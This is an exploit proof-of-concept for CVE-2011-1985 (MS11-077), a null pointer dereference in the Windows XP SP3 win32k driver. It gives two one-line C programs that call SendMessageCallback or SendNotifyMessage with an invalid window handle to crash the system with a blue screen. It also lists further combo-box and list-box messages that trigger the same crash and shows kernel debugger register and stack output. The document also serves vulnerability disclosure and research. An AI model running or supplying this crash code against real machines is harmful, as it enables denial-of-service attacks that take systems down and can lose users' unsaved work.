# Exploit Title: MS11-077 Win32k Null Pointer De-reference Vulnerability POC
# Date: 10/19/2011
# Author: KiDebug
# Version: Windows XP SP3 32bit
# Tested on: Windows XP SP3 32bit
# CVE : CVE-2011-1985
 
# Exploit Code. Only a single line of code can cause BSOD:
 
#include <Windows.h>
 
void main()
{
 SendMessageCallback((HWND)-1,CB_ADDSTRING,0,0,0,0);
}
 
or:
 
#include <Windows.h>
 
void main()
{
 SendNotifyMessage((HWND)-1,CB_ADDSTRING,0,0);
}
 
Those messages can aslo cause BSOD:
 
// CB_ADDSTRING             0x0143
// CB_INSERTSTRING          0x014A
// CB_FINDSTRING            0x014C
// CB_SELECTSTRING          0x014D
// CB_FINDSTRINGEXACT       0x0158
// LB_ADDSTRING             0x0180
// LB_INSERTSTRING          0x0181
// LB_SELECTSTRING          0x018C
// LB_FINDSTRING            0x018F
// LB_FINDSTRINGEXACT       0x01A2
// LB_INSERTSTRINGUPPER     0x01AA
// LB_INSERTSTRINGLOWER     0x01AB
// LB_ADDSTRINGUPPER        0x01AC
// LB_ADDSTRINGLOWER        0x01AD
 
 
0: kd> r
eax=0000001b ebx=ee0af1fa ecx=ffffffff edx=bbdd0650 esi=ffffffff edi=ee21fd64
eip=bf914e9b esp=ee21fd08 ebp=ee21fd08 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010206
win32k!NtUserfnINCBOXSTRING+0x8:
bf914e9b 8b4120          mov     eax,dword ptr [ecx+20h] ds:0023:0000001f=????????
 
0: kd> kp
ChildEBP RetAddr
ee21fd08 bf80ef2b win32k!NtUserfnINCBOXSTRING+0x8
ee21fd40 8054261c win32k!NtUserMessageCall+0xae
ee21fd40 7c92e4f4 nt!KiFastCallEntry+0xfc
0012ff2c 77d194be ntdll!KiFastSystemCallRet
0012ff5c 00401015 USER32!NtUserMessageCall+0xc
0012ff78 0040114c 1!main(void)+0x15 [[r:\temp\1\1.cpp @ 6]
0012ffc0 7c817067 1!__tmainCRTStartup(void)+0x10b [f:\dd\vctools\crt_bld\self_x86\crt\src\crt0.c @ 278]
0012fff0 00000000 kernel32!BaseProcessStart+0x23
